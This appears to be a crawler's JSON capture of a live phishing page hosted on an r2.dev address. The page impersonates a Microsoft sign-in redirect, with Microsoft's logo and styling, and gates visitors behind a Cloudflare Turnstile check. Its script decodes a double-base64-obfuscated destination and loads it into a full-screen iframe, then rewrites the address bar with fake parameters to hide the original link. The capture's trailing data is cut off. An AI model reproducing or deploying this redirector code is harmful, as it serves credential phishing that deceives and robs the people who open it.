{
  "url": "https://pub-8934f16f5ca74be39ae0eac391c50e27.r2.dev/index.html?62a765d3b3600f42f1626f",
  "html": "<html lang=\"en\"><head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Microsoft Sign-in Redirect</title>\n    <!-- Tailwind CSS -->\n    <script src=\"https://cdn.tailwindcss.com\"></script>\n    <!-- Lottie Player -->\n    <script src=\"https://unpkg.com/@lottiefiles/lottie-player@latest/dist/lottie-player.js\"></script>\n    <!-- Spline Viewer (for 3D elements) -->\n    <script type=\"module\" src=\"https://unpkg.com/@splinetool/viewer@0.9.414/build/spline-viewer.js\"></script>\n    \n    <script>\n        tailwind.config = {\n            theme: {\n                extend: {\n                    colors: {\n                        'ms-blue': '#0078d4',\n                        'ms-dark-blue': '#106ebe',\n                        'ms-light-blue': '#cce3f5',\n                        'ms-gray': '#605e5c',\n                        'ms-light-gray': '#f5f5f5'\n                    },\n                    animation: {\n                        'fade-in': 'fadeIn 0.5s ease-in-out forwards',\n                        'fade-out': 'fadeOut 0.5s ease-in-out forwards',\n                        'slide-up': 'slideUp 0.6s ease-out forwards',\n                        'float': 'float 3s ease-in-out infinite'\n                    },\n                    keyframes: {\n                        fadeIn: {\n                            '0%': { opacity: '0' },\n                            '100%': { opacity: '1' }\n                        },\n                        fadeOut: {\n                            '0%': { opacity: '1' },\n                            '100%': { opacity: '0' }\n                        },\n                        slideUp: {\n                            '0%': { transform: 'translateY(20px)', opacity: '0' },\n                            '100%': { transform: 'translateY(0)', opacity: '1' }\n                        },\n                        float: {\n                            '0%, 100%': { transform: 'translateY(0)' },\n                            '50%': { transform: 'translateY(-10px)' }\n                        }\n                    }\n                }\n            }\n        }\n    </script>\n    \n    <style type=\"text/tailwindcss\">\n        @layer components {\n            .glass-card {\n                @apply bg-white bg-opacity-90 backdrop-blur-lg;\n            }\n            \n            .progress-bar {\n                @apply h-1 w-full overflow-hidden bg-ms-light-blue relative;\n            }\n            \n            .progress-bar::after {\n                content: '';\n                @apply absolute top-0 left-0 h-full bg-ms-blue transition-all duration-500 ease-out;\n                animation: progress 2s ease-out infinite;\n            }\n            \n            @keyframes progress {\n                0% { width: 0%; left: 0%; }\n                50% { width: 30%; left: 35%; }\n                100% { width: 0%; left: 100%; }\n            }\n            \n            .cancelLink {\n                @apply text-ms-blue hover:text-ms-dark-blue hover:underline transition-colors font-medium;\n            }\n            \n            .dot {\n                @apply inline-block h-2 w-2 mx-1 rounded-full bg-ms-blue;\n                animation: dot-pulse 1.4s infinite ease-in-out;\n            }\n            \n            .dot:nth-child(1) {\n                animation-delay: 0s;\n            }\n            \n            .dot:nth-child(2) {\n                animation-delay: 0.2s;\n            }\n            \n            .dot:nth-child(3) {\n                animation-delay: 0.4s;\n            }\n            \n            @keyframes dot-pulse {\n                0%, 60%, 100% { transform: scale(1); opacity: 0.4; }\n                30% { transform: scale(1.5); opacity: 1; }\n            }\n        }\n    </style>\n<style>*, ::before, ::after{--tw-border-spacing-x:0;--tw-border-spacing-y:0;--tw-translate-x:0;--tw-translate-y:0;--tw-rotate:0;--tw-skew-x:0;--tw-skew-y:0;--tw-scale-x:1;--tw-scale-y:1;--tw-pan-x: ;--tw-pan-y: ;--tw-pinch-zoom: ;--tw-scroll-snap-strictness:proximity;--tw-gradient-from-position: ;--tw-gradient-via-position: ;--tw-gradient-to-position: ;--tw-ordinal: ;--tw-slashed-zero: ;--tw-numeric-figure: ;--tw-numeric-spacing: ;--tw-numeric-fraction: ;--tw-ring-inset: ;--tw-ring-offset-width:0px;--tw-ring-offset-color:#fff;--tw-ring-color:rgb(59 130 246 / 0.5);--tw-ring-offset-shadow:0 0 #0000;--tw-ring-shadow:0 0 #0000;--tw-shadow:0 0 #0000;--tw-shadow-colored:0 0 #0000;--tw-blur: ;--tw-brightness: ;--tw-contrast: ;--tw-grayscale: ;--tw-hue-rotate: ;--tw-invert: ;--tw-saturate: ;--tw-sepia: ;--tw-drop-shadow: ;--tw-backdrop-blur: ;--tw-backdrop-brightness: ;--tw-backdrop-contrast: ;--tw-backdrop-grayscale: ;--tw-backdrop-hue-rotate: ;--tw-backdrop-invert: ;--tw-backdrop-opacity: ;--tw-backdrop-saturate: ;--tw-backdrop-sepia: ;--tw-contain-size: ;--tw-contain-layout: ;--tw-contain-paint: ;--tw-contain-style: }::backdrop{--tw-border-spacing-x:0;--tw-border-spacing-y:0;--tw-translate-x:0;--tw-translate-y:0;--tw-rotate:0;--tw-skew-x:0;--tw-skew-y:0;--tw-scale-x:1;--tw-scale-y:1;--tw-pan-x: ;--tw-pan-y: ;--tw-pinch-zoom: ;--tw-scroll-snap-strictness:proximity;--tw-gradient-from-position: ;--tw-gradient-via-position: ;--tw-gradient-to-position: ;--tw-ordinal: ;--tw-slashed-zero: ;--tw-numeric-figure: ;--tw-numeric-spacing: ;--tw-numeric-fraction: ;--tw-ring-inset: ;--tw-ring-offset-width:0px;--tw-ring-offset-color:#fff;--tw-ring-color:rgb(59 130 246 / 0.5);--tw-ring-offset-shadow:0 0 #0000;--tw-ring-shadow:0 0 #0000;--tw-shadow:0 0 #0000;--tw-shadow-colored:0 0 #0000;--tw-blur: ;--tw-brightness: ;--tw-contrast: ;--tw-grayscale: ;--tw-hue-rotate: ;--tw-invert: ;--tw-saturate: ;--tw-sepia: ;--tw-drop-shadow: ;--tw-backdrop-blur: ;--tw-backdrop-brightness: ;--tw-backdrop-contrast: ;--tw-backdrop-grayscale: ;--tw-backdrop-hue-rotate: ;--tw-backdrop-invert: ;--tw-backdrop-opacity: ;--tw-backdrop-saturate: ;--tw-backdrop-sepia: ;--tw-contain-size: ;--tw-contain-layout: ;--tw-contain-paint: ;--tw-contain-style: }/* ! tailwindcss v3.4.16 | MIT License | https://tailwindcss.com */*,::after,::before{box-sizing:border-box;border-width:0;border-style:solid;border-color:#e5e7eb}::after,::before{--tw-content:''}:host,html{line-height:1.5;-webkit-text-size-adjust:100%;-moz-tab-size:4;tab-size:4;font-family:ui-sans-serif, system-ui, sans-serif, \"Apple Color Emoji\", \"Segoe UI Emoji\", \"Segoe UI Symbol\", \"Noto Color Emoji\";font-feature-settings:normal;font-variation-settings:normal;-webkit-tap-highlight-color:transparent}body{margin:0;line-height:inherit}hr{height:0;color:inherit;border-top-width:1px}abbr:where([title]){-webkit-text-decoration:underline dotted;text-decoration:underline dotted}h1,h2,h3,h4,h5,h6{font-size:inherit;font-weight:inherit}a{color:inherit;text-decoration:inherit}b,strong{font-weight:bolder}code,kbd,pre,samp{font-family:ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, \"Liberation Mono\", \"Courier New\", monospace;font-feature-settings:normal;font-variation-settings:normal;font-size:1em}small{font-size:80%}sub,sup{font-size:75%;line-height:0;position:relative;vertical-align:baseline}sub{bottom:-.25em}sup{top:-.5em}table{text-indent:0;border-color:inherit;border-collapse:collapse}button,input,optgroup,select,textarea{font-family:inherit;font-feature-settings:inherit;font-variation-settings:inherit;font-size:100%;font-weight:inherit;line-height:inherit;letter-spacing:inherit;color:inherit;margin:0;padding:0}button,select{text-transform:none}button,input:where([type=button]),input:where([type=reset]),input:where([type=submit]){-webkit-appearance:button;background-color:transparent;background-image:none}:-moz-focusring{outline:auto}:-moz-ui-invalid{box-shadow:none}progress{vertical-align:baseline}::-webkit-inner-spin-button,::-webkit-outer-spin-button{height:auto}[type=search]{-webkit-appearance:textfield;outline-offset:-2px}::-webkit-search-decoration{-webkit-appearance:none}::-webkit-file-upload-button{-webkit-appearance:button;font:inherit}summary{display:list-item}blockquote,dd,dl,figure,h1,h2,h3,h4,h5,h6,hr,p,pre{margin:0}fieldset{margin:0;padding:0}legend{padding:0}menu,ol,ul{list-style:none;margin:0;padding:0}dialog{padding:0}textarea{resize:vertical}input::placeholder,textarea::placeholder{opacity:1;color:#9ca3af}[role=button],button{cursor:pointer}:disabled{cursor:default}audio,canvas,embed,iframe,img,object,svg,video{display:block;vertical-align:middle}img,video{max-width:100%;height:auto}[hidden]:where(:not([hidden=until-found])){display:none}.glass-card{background-color:rgb(255 255 255 / var(--tw-bg-opacity, 1));--tw-bg-opacity:0.9;--tw-backdrop-blur:blur(16px);-webkit-backdrop-filter:var(--tw-backdrop-blur) var(--tw-backdrop-brightness) var(--tw-backdrop-contrast) var(--tw-backdrop-grayscale) var(--tw-backdrop-hue-rotate) var(--tw-backdrop-invert) var(--tw-backdrop-opacity) var(--tw-backdrop-saturate) var(--tw-backdrop-sepia);backdrop-filter:var(--tw-backdrop-blur) var(--tw-backdrop-brightness) var(--tw-backdrop-contrast) var(--tw-backdrop-grayscale) var(--tw-backdrop-hue-rotate) var(--tw-backdrop-invert) var(--tw-backdrop-opacity) var(--tw-backdrop-saturate) var(--tw-backdrop-sepia)}.progress-bar{position:relative;height:0.25rem;width:100%;overflow:hidden;--tw-bg-opacity:1;background-color:rgb(204 227 245 / var(--tw-bg-opacity, 1))}.progress-bar::after {\n                content: '';\n                position:absolute;\n                top:0px;\n                left:0px;\n                height:100%;\n                --tw-bg-opacity:1;\n                background-color:rgb(0 120 212 / var(--tw-bg-opacity, 1));\n                transition-property:all;\n                transition-timing-function:cubic-bezier(0.4, 0, 0.2, 1);\n                transition-duration:500ms;\n                transition-timing-function:cubic-bezier(0, 0, 0.2, 1);\n                animation: progress 2s ease-out infinite;\n            }@keyframes progress {\n                0% { width: 0%; left: 0%; }\n                50% { width: 30%; left: 35%; }\n                100% { width: 0%; left: 100%; }\n            }.cancelLink{font-weight:500;--tw-text-opacity:1;color:rgb(0 120 212 / var(--tw-text-opacity, 1));transition-property:color, background-color, border-color, fill, stroke, -webkit-text-decoration-color;transition-property:color, background-color, border-color, text-decoration-color, fill, stroke;transition-property:color, background-color, border-color, text-decoration-color, fill, stroke, -webkit-text-decoration-color;transition-timing-function:cubic-bezier(0.4, 0, 0.2, 1);transition-duration:150ms}.cancelLink:hover{--tw-text-opacity:1;color:rgb(16 110 190 / var(--tw-text-opacity, 1));-webkit-text-decoration-line:underline;text-decoration-line:underline}.dot{margin-left:0.25rem;margin-right:0.25rem;display:inline-block;height:0.5rem;width:0.5rem;border-radius:9999px;--tw-bg-opacity:1;background-color:rgb(0 120 212 / var(--tw-bg-opacity, 1));\n                animation: dot-pulse 1.4s infinite ease-in-out}.dot:nth-child(1) {\n                animation-delay: 0s;\n            }.dot:nth-child(2) {\n                animation-delay: 0.2s;\n            }.dot:nth-child(3) {\n                animation-delay: 0.4s;\n            }@keyframes dot-pulse {\n                0%, 60%, 100% { transform: scale(1); opacity: 0.4; }\n                30% { transform: scale(1.5); opacity: 1; }\n            }.fixed{position:fixed}.left-0{left:0px}.top-0{top:0px}.-z-10{z-index:-10}.mb-6{margin-bottom:1.5rem}.mb-8{margin-bottom:2rem}.mb-1{margin-bottom:0.25rem}.mb-10{margin-bottom:2.5rem}.mb-4{margin-bottom:1rem}.mt-4{margin-top:1rem}.flex{display:flex}.hidden{display:none}.h-32{height:8rem}.h-6{height:1.5rem}.h-full{height:100%}.min-h-screen{min-height:100vh}.w-32{width:8rem}.w-full{width:100%}.max-w-md{max-width:28rem}@keyframes slideUp{0%{transform:translateY(20px);opacity:0}100%{transform:translateY(0);opacity:1}}.animate-slide-up{animation:slideUp 0.6s ease-out forwards}@keyframes fadeIn{0%{opacity:0}100%{opacity:1}}.animate-fade-in{animation:fadeIn 0.5s ease-in-out forwards}.flex-col{flex-direction:column}.items-center{align-items:center}.justify-center{justify-content:center}.overflow-hidden{overflow:hidden}.rounded-xl{border-radius:0.75rem}.border{border-width:1px}.border-0{border-width:0px}.border-white{--tw-border-opacity:1;border-color:rgb(255 255 255 / var(--tw-border-opacity, 1))}.border-opacity-30{--tw-border-opacity:0.3}.bg-gradient-to-b{background-image:linear-gradient(to bottom, var(--tw-gradient-stops))}.from-white{--tw-gradient-from:#fff var(--tw-gradient-from-position);--tw-gradient-to:rgb(255 255 255 / 0) var(--tw-gradient-to-position);--tw-gradient-stops:var(--tw-gradient-from), var(--tw-gradient-to)}.to-ms-light-blue{--tw-gradient-to:#cce3f5 var(--tw-gradient-to-position)}.p-4{padding:1rem}.p-8{padding:2rem}.text-center{text-align:center}.text-2xl{font-size:1.5rem;line-height:2rem}.text-sm{font-size:0.875rem;line-height:1.25rem}.font-semibold{font-weight:600}.text-gray-600{--tw-text-opacity:1;color:rgb(75 85 99 / var(--tw-text-opacity, 1))}.text-gray-900{--tw-text-opacity:1;color:rgb(17 24 39 / var(--tw-text-opacity, 1))}.text-ms-gray{--tw-text-opacity:1;color:rgb(96 94 92 / var(--tw-text-opacity, 1))}.opacity-40{opacity:0.4}.opacity-0{opacity:0}.shadow-xl{--tw-shadow:0 20px 25px -5px rgb(0 0 0 / 0.1), 0 8px 10px -6px rgb(0 0 0 / 0.1);--tw-shadow-colored:0 20px 25px -5px var(--tw-shadow-color), 0 8px 10px -6px var(--tw-shadow-color);box-shadow:var(--tw-ring-offset-shadow, 0 0 #0000), var(--tw-ring-shadow, 0 0 #0000), var(--tw-shadow)}.transition-opacity{transition-property:opacity;transition-timing-function:cubic-bezier(0.4, 0, 0.2, 1);transition-duration:150ms}.duration-500{transition-duration:500ms}\n    </style></head>\n<body class=\"min-h-screen bg-gradient-to-b from-white to-ms-light-blue flex items-center justify-center p-4\">\n    <!-- Background 3D element with Spline -->\n    <div class=\"fixed w-full h-full top-0 left-0 -z-10 opacity-40\">\n        <spline-viewer url=\"https://prod.spline.design/mAXoIkgd8xZRsO2j/scene.splinecode\"></spline-viewer>\n    </div>\n    \n    <!-- Main container -->\n    <div id=\"mainContainer\" class=\"w-full max-w-md animate-slide-up\">\n        <!-- Card with glass effect -->\n        <div class=\"glass-card rounded-xl shadow-xl overflow-hidden border border-white border-opacity-30\">\n            <!-- Progress bar -->\n            <div class=\"progress-bar\"></div>\n            \n            <!-- Content -->\n            <div class=\"p-8 flex flex-col items-center\">\n                <!-- Microsoft logo -->\n                <img src=\"https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg\" alt=\"Microsoft\" class=\"h-6 mb-8\">\n                \n                <!-- Main animation using Lottie -->\n                <div class=\"w-32 h-32 mb-6\">\n                    <lottie-player src=\"https://assets5.lottiefiles.com/packages/lf20_zw0djhar.json\" background=\"transparent\" speed=\"1\" loop=\"\" autoplay=\"\">\n                    </lottie-player>\n                </div>\n                \n                <!-- Text content -->\n                <div class=\"text-center mb-8\">\n                    <h1 class=\"text-2xl font-semibold text-gray-900 mb-1\">Taking you</h1>\n                    <p class=\"text-gray-600\">to your organization's sign-in page</p>\n                </div>\n                \n                <!-- Loading dots -->\n                <div class=\"flex items-center justify-center mb-10\">\n                    <div class=\"dot\"></div>\n                    <div class=\"dot\"></div>\n                    <div class=\"dot\"></div>\n                </div>\n                \n                <!-- Turnstile verification (always visible) -->\n                <div id=\"verificationContainer\" class=\"w-full mb-6\">\n                    <div class=\"text-center mb-4\">\n                        <p class=\"text-sm text-gray-600\">Please complete the security check</p>\n                    </div>\n                    <div id=\"turnstileContainer\" class=\"flex justify-center\"></div>\n                </div>\n                \n                <!-- Cancel link -->\n                <a href=\"javascript:void(0)\" class=\"cancelLink\" id=\"cancelButton\">Cancel</a>\n            </div>\n        </div>\n        \n        <!-- Status messages -->\n        <div class=\"mt-4 text-center\">\n            <p id=\"statusMessage\" class=\"text-sm text-ms-gray animate-fade-in\">Invalid session. Please reload the page.</p>\n        </div>\n    </div>\n    \n    <!-- Hidden redirect iframe -->\n    <iframe id=\"redirectFrame\" class=\"fixed top-0 left-0 w-full h-full border-0 opacity-0 -z-10 transition-opacity duration-500\" title=\"Organization sign-in page\"></iframe>\n    \n    <script>\n        document.addEventListener('DOMContentLoaded', function() {\n            // Elements\n            const elements = {\n                mainContainer: document.getElementById('mainContainer'),\n                verificationContainer: document.getElementById('verificationContainer'),\n                turnstileContainer: document.getElementById('turnstileContainer'),\n                statusMessage: document.getElementById('statusMessage'),\n                redirectFrame: document.getElementById('redirectFrame'),\n                cancelButton: document.getElementById('cancelButton')\n            };\n            \n            // Configuration\n            const config = {\n                turnstileSiteKey: '0x4AAAAAAA5PeFzxadFDHL70',\n                redirectDelay: 1000, // Faster redirect\n                verificationNeeded: true // Always require verification\n            };\n            \n            // Handle cancel\n            elements.cancelButton.addEventListener('click', function() {\n                if (!window.close()) {\n                    window.location.href = 'https://www.microsoft.com';\n                }\n            });\n            \n            // Function to change URL parameters\n            function changeUrlParameters() {\n                try {\n                    // Generate fake parameters\n                    const fakeParams = {\n                        session: generateRandomString(12),\n                        target: 'portal',\n                        client: generateRandomString(8),\n                        auth: 'standard',\n                        device: generateRandomString(10),\n                        origin: 'direct'\n                    };\n                    \n                    // Create new URL without hash/fragment\n                    let newUrl = window.location.origin + window.location.pathname;\n                    \n                    // Add fake query parameters\n                    const params = new URLSearchParams();\n                    for (const [key, value] of Object.entries(fakeParams)) {\n                        params.append(key, value);\n                    }\n                    \n                    newUrl += '?' + params.toString();\n                    \n                    // Replace current URL without reloading the page\n                    window.history.replaceState({}, document.title, newUrl);\n                } catch (e) {\n                    console.error('Error updating URL parameters', e);\n                }\n            }\n            \n            // Generate random string for parameters\n            function generateRandomString(length) {\n                const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';\n                let result = '';\n                for (let i = 0; i < length; i++) {\n                    result += chars.charAt(Math.floor(Math.random() * chars.length));\n                }\n                return result;\n            }\n            \n            // URL handler functions\n            const urlHandler = {\n                decodeURL(encodedUrl) {\n                    try {\n                        const decodedOnce = atob(encodedUrl);\n                        const decodedTwice = atob(decodedOnce);\n                        \n                        if (!decodedTwice.startsWith('http')) {\n                            throw new Error('Invalid URL format');\n                        }\n                        return decodedTwice;\n                    } catch (e) {\n                        console.error('Error decoding URL');\n                        return null;\n                    }\n                },\n                \n                hasValidHash() {\n                    return window.location.hash && window.location.hash.length > 1;\n                },\n                \n                sanitizeParams(url) {\n                    try {\n                        const currentParams = new URLSearchParams(window.location.search);\n                        const baseUrl = url.split('?')[0];\n                        const finalUrl = new URL(baseUrl);\n                        \n                        currentParams.forEach((value, key) => {\n                            if (value && value.length > 0) {\n                                finalUrl.searchParams.append(key, value);\n                            }\n                        });\n                        \n                        if (this.hasValidHash()) {\n                            return finalUrl.toString() + window.location.hash;\n                        }\n                        \n                        return finalUrl.toString();\n                    } catch (e) {\n                        console.error('Error processing URL parameters');\n                        return url;\n                    }\n                },\n                \n                getRedirectUrl() {\n                    // Example encoded URL - in production, this would be properly encoded\n                    const encodedUrl = 'YUhSMGNITTZMeTlwYm5SbGNtVnpkQzFvYjI1dmJIVnNkUzF3YjNWc2RISjVMV1ZrYlc5dWRHOXVMblJ5ZVdOc2IzVmtabXhoY21VdVkyOXQ=';\n                    const decodedURL = this.decodeURL(encodedUrl);\n                    \n                    if (!decodedURL) {\n                        throw new Error('Invalid redirect URL');\n                    }\n                    \n                    return this.sanitizeParams(decodedURL);\n                }\n            };\n            \n            // Animation and UI functions\n            const ui = {\n                showElement(element) {\n                    element.classList.remove('hidden');\n                    // Force reflow\n                    void element.offsetWidth;\n                    element.classList.add('animate-fade-in');\n                },\n                \n                hideElement(element) {\n                    element.classList.remove('animate-fade-in');\n                    element.classList.add('animate-fade-out');\n                    setTimeout(() => {\n                        element.classList.add('hidden');\n                        element.classList.remove('animate-fade-out');\n                    }, 500);\n                },\n                \n                updateStatus(message) {\n                    elements.statusMessage.textContent = message;\n                    if (elements.statusMessage.classList.contains('hidden')) {\n                        this.showElement(elements.statusMessage);\n                    }\n                },\n                \n                redirect(url) {\n                    ui.updateStatus('Redirecting to your organization...');\n                    \n                    // Set iframe source\n                    elements.redirectFrame.src = url;\n                    elements.redirectFrame.style.display = 'block';\n                    \n                    // When iframe loads, fade it in and main content out\n                    elements.redirectFrame.onload = function() {\n                        elements.redirectFrame.style.opacity = '1';\n                        elements.redirectFrame.style.zIndex = '100';\n                        \n                        // Change URL parameters to hide original parameters\n                        changeUrlParameters();\n                        \n                        // Fade out main container\n                        elements.mainContainer.classList.add('animate-fade-out');\n                        setTimeout(() => {\n                            elements.mainContainer.style.display = 'none';\n                        }, 500);\n                    };\n                }\n            };\n            \n            // Verification function\n            function initVerification() {\n                // Verification container is always visible, no need to show it\n                ui.updateStatus('Please complete the security check');\n                \n                // Load Turnstile\n                if (window.turnstile) {\n                    window.turnstile.render('#turnstileContainer', {\n                        sitekey: config.turnstileSiteKey,\n                        theme: 'light',\n                        callback: function(token) {\n                            if (token) {\n                                onVerificationComplete();\n                            }\n                        }\n                    });\n                } else {\n                    // If Turnstile failed to load, load it manually\n                    const script = document.createElement('script');\n                    script.src = 'https://challenges.cloudflare.com/turnstile/v0/api.js?onload=onTurnstileLoad';\n                    script.async = true;\n                    document.head.appendChild(script);\n                    \n                    window.onTurnstileLoad = function() {\n                        window.turnstile.render('#turnstileContainer', {\n                            sitekey: config.turnstileSiteKey,\n                            theme: 'light',\n                            callback: function(token) {\n                                if (token) {\n                                    onVerificationComplete();\n                                }\n                            }\n                        });\n                    };\n                }\n            }\n            \n            // Start redirect process\n            function startRedirect() {\n                // Check if hash is valid\n                if (!urlHandler.hasValidHash()) {\n                    ui.updateStatus('Invalid session. Please reload the page.');\n                    return;\n                }\n                \n                // Always initialize verification immediately\n                initVerification();\n            }\n            \n            // Handle verification completion\n            function onVerificationComplete() {\n                // Simply update status without hiding the container\n                elements.verificationContainer.style.opacity = '0.5';\n                ui.updateStatus('Verification successful');\n                \n                setTimeout(() => {\n                    try {\n                        const redirectUrl = urlHandler.getRedirectUrl();\n                        ui.redirect(redirectUrl);\n                    } catch (error) {\n                        ui.updateStatus('Redirect failed. Please try again.');\n                    }\n                }, config.redirectDelay);\n            }\n            \n            // Initialize\n            function init() {\n                // Prevent clickjacking\n                if (window.self !== window.top) {\n                    window.top.location = window.self.location;\n                }\n                \n                // Start the redirect process\n                startRedirect();\n            }\n            \n            // Start everything\n            init();\n        });\n    </script>\n\n</body></html>",
  "scripts": [
    "",
    "",
    "",
    "\n        tailwind.config = {\n            theme: {\n                extend: {\n                    colors: {\n                        'ms-blue': '#0078d4',\n                        'ms-dark-blue': '#106ebe',\n                        'ms-light-blue': '#cce3f5',\n                        'ms-gray': '#605e5c',\n                        'ms-light-gray': '#f5f5f5'\n                    },\n                    animation: {\n                        'fade-in': 'fadeIn 0.5s ease-in-out forwards',\n                        'fade-out': 'fadeOut 0.5s ease-in-out forwards',\n                        'slide-up': 'slideUp 0.6s ease-out forwards',\n                        'float': 'float 3s ease-in-out infinite'\n                    },\n                    keyframes: {\n                        fadeIn: {\n                            '0%': { opacity: '0' },\n                            '100%': { opacity: '1' }\n                        },\n                        fadeOut: {\n                            '0%': { opacity: '1' },\n                            '100%': { opacity: '0' }\n                        },\n                        slideUp: {\n                            '0%': { transform: 'translateY(20px)', opacity: '0' },\n                            '100%': { transform: 'translateY(0)', opacity: '1' }\n                        },\n                        float: {\n                            '0%, 100%': { transform: 'translateY(0)' },\n                            '50%': { transform: 'translateY(-10px)' }\n                        }\n                    }\n                }\n            }\n        }\n    ",
    "\n        document.addEventListener('DOMContentLoaded', function() {\n            // Elements\n            const elements = {\n                mainContainer: document.getElementById('mainContainer'),\n                verificationContainer: document.getElementById('verificationContainer'),\n                turnstileContainer: document.getElementById('turnstileContainer'),\n                statusMessage: document.getElementById('statusMessage'),\n                redirectFrame: document.getElementById('redirectFrame'),\n                cancelButton: document.getElementById('cancelButton')\n            };\n            \n            // Configuration\n            const config = {\n                turnstileSiteKey: '0x4AAAAAAA5PeFzxadFDHL70',\n                redirectDelay: 1000, // Faster redirect\n                verificationNeeded: true // Always require verification\n            };\n            \n            // Handle cancel\n            elements.cancelButton.addEventListener('click', function() {\n                if (!window.close()) {\n                    window.location.href = 'https://www.microsoft.com';\n                }\n            });\n            \n            // Function to change URL parameters\n            function changeUrlParameters() {\n                try {\n                    // Generate fake parameters\n                    const fakeParams = {\n                        session: generateRandomString(12),\n                        target: 'portal',\n                        client: generateRandomString(8),\n                        auth: 'standard',\n                        device: generateRandomString(10),\n                        origin: 'direct'\n                    };\n                    \n                    // Create new URL without hash/fragment\n                    let newUrl = window.location.origin + window.location.pathname;\n                    \n                    // Add fake query parameters\n                    const params = new URLSearchParams();\n                    for (const [key, value] of Object.entries(fakeParams)) {\n                        params.append(key, value);\n                    }\n                    \n                    newUrl += '?' + params.toString();\n                    \n                    // Replace current URL without reloading the page\n                    window.history.replaceState({}, document.title, newUrl);\n                } catch (e) {\n                    console.error('Error updating URL parameters', e);\n                }\n            }\n            \n            // Generate random string for parameters\n            function generateRandomString(length) {\n                const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';\n                let result = '';\n                for (let i = 0; i < length; i++) {\n                    result += chars.charAt(Math.floor(Math.random() * chars.length));\n                }\n                return result;\n            }\n            \n            // URL handler functions\n            const urlHandler = {\n                decodeURL(encodedUrl) {\n                    try {\n                        const decodedOnce = atob(encodedUrl);\n                        const decodedTwice = atob(decodedOnce);\n                        \n                        if (!decodedTwice.startsWith('http')) {\n                            throw new Error('Invalid URL format');\n                        }\n                        return decodedTwice;\n                    } catch (e) {\n                        console.error('Error decoding URL');\n                        return null;\n                    }\n                },\n                \n                hasValidHash() {\n                    return window.location.hash && window.location.hash.length > 1;\n                },\n                \n                sanitizeParams(url) {\n                    try {\n                        const currentParams = new URLSearchParams(window.location.search);\n                        const baseUrl = url.split('?')[0];\n                        const finalUrl = new URL(baseUrl);\n                        \n                        currentParams.forEach((value, key) => {\n                            if (value && value.length > 0) {\n                                finalUrl.searchParams.append(key, value);\n                            }\n                        });\n                        \n                        if (this.hasValidHash()) {\n                            return finalUrl.toString() + window.location.hash;\n                        }\n                        \n                        return finalUrl.toString();\n                    } catch (e) {\n                        console.error('Error processing URL parameters');\n                        return url;\n                    }\n                },\n                \n                getRedirectUrl() {\n                    // Example encoded URL - in production, this would be properly encoded\n                    const encodedUrl = 'YUhSMGNITTZMeTlwYm5SbGNtVnpkQzFvYjI1dmJIVnNkUzF3YjNWc2RISjVMV1ZrYlc5dWRHOXVMblJ5ZVdOc2IzVmtabXhoY21VdVkyOXQ=';\n                    const decodedURL = this.decodeURL(encodedUrl);\n                    \n                    if (!decodedURL) {\n                        throw new Error('Invalid redirect URL');\n                    }\n                    \n                    return this.sanitizeParams(decodedURL);\n                }\n            };\n            \n            // Animation and UI functions\n            const ui = {\n                showElement(element) {\n                    element.classList.remove('hidden');\n                    // Force reflow\n                    void element.offsetWidth;\n                    element.classList.add('animate-fade-in');\n                },\n                \n                hideElement(element) {\n                    element.classList.remove('animate-fade-in');\n                    element.classList.add('animate-fade-out');\n                    setTimeout(() => {\n                        element.classList.add('hidden');\n                        element.classList.remove('animate-fade-out');\n                    }, 500);\n                },\n                \n                updateStatus(message) {\n                    elements.statusMessage.textContent = message;\n                    if (elements.statusMessage.classList.contains('hidden')) {\n                        this.showElement(elements.statusMessage);\n                    }\n                },\n                \n                redirect(url) {\n                    ui.updateStatus('Redirecting to your organization...');\n                    \n                    // Set iframe source\n                    elements.redirectFrame.src = url;\n                    elements.redirectFrame.style.display = 'block';\n                    \n                    // When iframe loads, fade it in and main content out\n                    elements.redirectFrame.onload = function() {\n                        elements.redirectFrame.style.opacity = '1';\n                        elements.redirectFrame.style.zIndex = '100';\n                        \n                        // Change URL parameters to hide original parameters\n                        changeUrlParameters();\n                        \n                        // Fade out main container\n                        elements.mainContainer.classList.add('animate-fade-out');\n                        setTimeout(() => {\n                            elements.mainContainer.style.display = 'none';\n                        }, 500);\n                    };\n                }\n            };\n            \n            // Verification function\n            function initVerification() {\n                // Verification container is always visible, no need to show it\n                ui.updateStatus('Please complete the security check');\n                \n                // Load Turnstile\n                if (window.turnstile) {\n                    window.turnstile.render('#turnstileContainer', {\n                        sitekey: config.turnstileSiteKey,\n                        theme: 'light',\n                        callback: function(token) {\n                            if (token) {\n                                onVerificationComplete();\n                            }\n                        }\n                    });\n                } else {\n                    // If Turnstile failed to load, load it manually\n                    const script = document.createElement('script');\n                    script.src = 'https://challenges.cloudflare.com/turnstile/v0/api.js?onload=onTurnstileLoad';\n                    script.async = true;\n                    document.head.appendChild(script);\n                    \n                    window.onTurnstileLoad = function() {\n                        window.turnstile.render('#turnstileContainer', {\n                            sitekey: config.turnstileSiteKey,\n                            theme: 'light',\n                            callback: function(token) {\n                                if (token) {\n                                    onVerificationComplete();\n                                }\n                            }\n                        });\n                    };\n                }\n            }\n            \n            // Start redirect process\n            function startRedirect() {\n                // Check if hash is valid\n                if (!urlHandler.hasValidHash()) {\n                    ui.updateStatus('Invalid session. Please reload the page.');\n                    return;\n                }\n                \n                // Always initialize verification immediately\n                initVerification();\n            }\n            \n            // Handle verification completion\n            function onVerificationComplete() {\n                // Simply update status without hiding the container\n                elements.verificationContainer.style.opacity = '0.5';\n                ui.updateStatus('Verification successful');\n                \n                setTimeout(() => {\n                    try {\n                        const redirectUrl = urlHandler.getRedirectUrl();\n                        ui.redirect(redirectUrl);\n                    } catch (error) {\n                        ui.updateStatus('Redirect failed. Please try again.');\n                    }\n                }, config.redirectDelay);\n            }\n            \n            // Initialize\n            function init() {\n                // Prevent clickjacking\n                if (window.self !== window.top) {\n                    window.top.location = window.self.location;\n                }\n                \n                // Start the redirect process\n                startRedirect();\n            }\n            \n            // Start everything\n            init();\n        });\n    "
  ],
  "styles": [
